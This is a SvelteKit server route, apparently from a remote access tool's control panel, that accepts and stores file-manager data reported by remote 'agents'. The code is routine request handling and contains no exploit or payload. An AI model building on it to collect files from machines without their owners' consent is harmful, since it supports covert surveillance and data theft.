import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { fileManagerStore, FileManagerError } from '$lib/server/rat/file-manager';
import type { FileManagerResource } from '$lib/types/file-manager';

interface FileManagerStatePayload {
	resource?: FileManagerResource;
	resources?: FileManagerResource[];
	clear?: boolean;
}

export const POST: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	let payload: FileManagerStatePayload;
	try {
		payload = (await request.json()) as FileManagerStatePayload;
	} catch (err) {
		throw error(400, 'Invalid file manager payload');
	}

	if (!payload || typeof payload !== 'object') {
		throw error(400, 'File manager payload must be an object');
	}

	if (payload.clear) {
		fileManagerStore.clearAgent(id);
	}

	const items: FileManagerResource[] = [];
	if (payload.resource) {
		items.push(payload.resource);
	}
	if (payload.resources?.length) {
		items.push(...payload.resources);
	}

	if (items.length === 0) {
		return json({ accepted: true, ingested: 0 });
	}

	try {
		const ingested = items.map((item) => fileManagerStore.ingestResource(id, item));
		return json({ accepted: true, ingested: ingested.length });
	} catch (err) {
		if (err instanceof FileManagerError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to ingest file manager resources');
	}
};
